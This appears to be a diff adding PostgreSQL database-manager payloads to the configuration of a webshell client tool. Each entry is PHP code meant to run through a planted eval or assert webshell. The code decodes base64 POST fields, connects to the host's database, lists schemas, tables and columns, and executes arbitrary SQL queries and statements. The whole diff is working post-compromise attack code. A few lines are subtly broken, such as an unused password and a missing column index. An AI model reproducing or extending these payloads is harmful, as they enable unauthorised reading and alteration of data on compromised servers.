@@ -1,6 +1,142 @@
 ﻿<?xml version="1.0" encoding="utf-8"?>
 <customShellType>
   <funcCodeSetting>
+  	<func>
+			<name>ConnectDb</name>
+			<type>phpEval,phpEval_Cookie,phpAssert,phpEval_Base64,phpAssert_Base64</type>
+			<path>/DbManager/postgresql</path>
+			<funcParam location="Body" encrymode="Base64" >connStr</funcParam>
+			<item>
+				<![CDATA[
+				$C=base64_decode($_POST["$connStr$"]);
+				list($host,$user,$pwd,$dbname,$lan)=explode(";",$C);
+				$T=@pg_pconnect("host=$host dbname=$dbname user=$user");
+				print($T?"1":"0");
+				@pg_close($T);
+				]]>
+			</item>
+		</func>
+		<func>
+			<name>GetDbName</name>
+			<type>phpEval,phpEval_Cookie,phpAssert,phpEval_Base64,phpAssert_Base64</type>
+			<path>/DbManager/postgresql</path>
+			<funcParam location="Body" encrymode="Base64" >connStr</funcParam>
+			<item>
+				<![CDATA[
+				$C=base64_decode($_POST["$connStr$"]);
+				list($host,$user,$pwd,$dbname,$lan)=explode(";",$C);
+				$T=@pg_pconnect("host=$host dbname=$dbname user=$user");
+				$q=@pg_query($T,"SELECT DISTINCT schemaname FROM pg_tables");
+				while($rs=@pg_fetch_row($q))
+				{
+				print(trim($rs[0]).chr(9));
+				}
+				@pg_close($T);
+				]]>
+			</item>
+		</func>
+		<func>
+			<name>GetTableName</name>
+			<type>phpEval,phpEval_Cookie,phpAssert,phpEval_Base64,phpAssert_Base64</type>
+			<path>/DbManager/postgresql</path>
+			<funcParam location="Body" encrymode="Base64" >connStr</funcParam>
+			<funcParam location="Body" encrymode="Base64" >dbName</funcParam>
+			<item>
+				<![CDATA[
+				$C=base64_decode($_POST["$connStr$"]);
+				$db=base64_decode($_POST["$dbName$"]);
+				list($host,$user,$pwd,$dbname,$lan)=explode(";",$C);
+				$T=@pg_pconnect("host=$host dbname=$dbname user=$user");
+				$q=@pg_query($T,"SELECT tablename FROM pg_tables WHERE schemaname='$db'");
+				while($rs=@pg_fetch_row($q))
+				{
+				print(trim($rs[0]).chr(9));
+				}
+				@pg_close($T);
+				]]>
+			</item>
+		</func>
+		<func>
+			<name>GetColumnType</name>
+			<type>phpEval,phpEval_Cookie,phpAssert,phpEval_Base64,phpAssert_Base64</type>
+			<path>/DbManager/postgresql</path>
+			<funcParam location="Body" encrymode="Base64" >connStr</funcParam>
+			<funcParam location="Body" encrymode="Base64" >dbName</funcParam>
+			<funcParam location="Body" encrymode="Base64" >tableName</funcParam>
+			<item>
+				<![CDATA[
+				$C=base64_decode($_POST["$connStr$"]);
+				$db=base64_decode($_POST["$dbName$"]);
+				$table=base64_decode($_POST["$tableName$"]);
+				list($host,$user,$pwd,$dbname,$lan)=explode(";",$C);
+				$T=@pg_pconnect("host=$host dbname=$dbname user=$user");
+				$q=@pg_query($T,"SELECT column_name FROM information_schema.columns WHERE table_schema='$db' AND table_name='$table'");
+				while($rs=@pg_fetch_row($q))
+				{
+				print(trim($rs[0])." (".$rs[1].")".chr(9));
+				}
+				@pg_close($T);
+				]]>
+			</item>
+		</func>
+		<func>
+			<name>ExecuteReader</name>
+			<type>phpEval,phpEval_Cookie,phpAssert,phpEval_Base64,phpAssert_Base64</type>
+			<path>/DbManager/postgresql</path>
+			<funcParam location="Body" encrymode="Base64" >connStr</funcParam>
+			<funcParam location="Body" encrymode="Base64" >dbName</funcParam>
+			<funcParam location="Body" encrymode="Base64" >sqlStr</funcParam>
+			<item>
+				<![CDATA[
+				$C=base64_decode($_POST["$connStr$"]);
+				$db=base64_decode($_POST["$dbName$"]);
+				$sql=base64_decode($_POST["$sqlStr$"]);
+				list($host,$user,$pwd,$dbname,$lan)=explode(";",$C);
+				$T=@pg_pconnect("host=$host dbname=$dbname user=$user");
+				@pg_query("SET NAMES utf8");
+				$q=@pg_query($T,$sql);
+				$i=0;
+				while($col=@pg_field_name($q,$i))
+				{
+				print($col."\t|\t");$i++;
+				}
+				print("\r\n");
+				while($rs=@pg_fetch_row($q))
+				{
+				for($c=0;$c<$i;$c++)
+				{
+				print(trim($rs[$c]));
+				print("\t|\t");
+				}
+				print("\r\n");
+				}
+				@pg_close($T);
+				]]>
+			</item>
+		</func>
+		<func>
+			<name>ExecuteNonQuery</name>
+			<type>phpEval,phpEval_Cookie,phpAssert,phpEval_Base64,phpAssert_Base64</type>
+			<path>/DbManager/postgresql</path>
+			<funcParam location="Body" encrymode="Base64" >connStr</funcParam>
+			<funcParam location="Body" encrymode="Base64" >dbName</funcParam>
+			<funcParam location="Body" encrymode="Base64" >sqlStr</funcParam>
+			<item>
+				<![CDATA[
+				$C=base64_decode($_POST["$connStr$"]);
+				$db=base64_decode($_POST["$dbName$"]);
+				$sql=base64_decode($_POST["$sqlStr$"]);
+				list($host,$user,$pwd,$dbname,$lan)=explode(";",$C);
+				$T=@pg_pconnect("host=$host dbname=$dbname user=$user");
+				@pg_query($T,"SET NAMES utf8");
+				$q=@pg_query($T,$sql);
+				print("Result\t|\t\r\n");
+				print($q?"Execute Successfully!":pg_error());
+				print("\t|\t\r\n");
+				@pg_close($T);
+				]]>
+			</item>
+		</func>
     <func>
       <name>ConnectDb</name>
 	  <type>phpEval,phpEval_Cookie,phpAssert,phpEval_Base64,phpAssert_Base64</type>
